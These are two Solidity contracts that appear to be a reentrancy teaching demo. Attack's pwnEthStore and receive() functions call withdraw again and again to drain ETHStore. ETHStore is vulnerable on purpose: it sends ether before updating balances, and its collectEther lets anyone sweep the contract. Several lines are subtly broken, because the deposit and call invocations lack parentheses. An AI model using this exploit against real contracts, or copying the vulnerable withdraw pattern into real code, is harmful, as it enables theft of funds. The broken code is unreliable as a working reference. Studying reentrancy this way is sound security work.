// SPDX-License-Identifier: GPL-2.0-or-later



pragma solidity 0.7.6;
import "./ETHStore.sol";

contract Attack {
    ETHStore public ethStore;

    bool public fun = true;

    constructor(address _ethStore) {
        ethStore = ETHStore(_ethStore);
    }

    function setFun() public {
        fun = !fun;
    }

    function pwnEthStore() public payable {
        ethStore.deposit{ value: 1 ether };
        if (fun) {
            ethStore.withdraw(1 ether);
        } else {
            ethStore.withdraw1(1 ether);
        }
    }

    function collectEther() public {
        msg.sender.transfer(address(this).balance);
    }

    receive() external payable {
        if (msg.sender == address(ethStore)) {
            if (fun) {
                if (address(ethStore).balance > 1 ether) {
                    ethStore.withdraw(1 ether);
                }
            } else {
                if (address(ethStore).balance > 1 ether) {
                    ethStore.withdraw1(1 ether);
                }
            }
        }
    }
}

// SPDX-License-Identifier: GPL-2.0-or-later



pragma solidity 0.7.6;

contract ETHStore {
    mapping(address => uint256) public balance;

    function deposit() public payable {
        balance[msg.sender] += msg.value;
    }

    function withdraw(uint256 withdrawWei) public {
        require(balance[msg.sender] >= withdrawWei, "balance not En");
        msg.sender.call{ value: withdrawWei };
        balance[msg.sender] -= withdrawWei;
    }

    function withdraw1(uint256 withdrawWei) public {
        require(balance[msg.sender] >= withdrawWei, "balance not En");
        payable(msg.sender).transfer(withdrawWei);
        balance[msg.sender] -= withdrawWei;
    }

    function collectEther() public {
        msg.sender.transfer(address(this).balance);
    }
}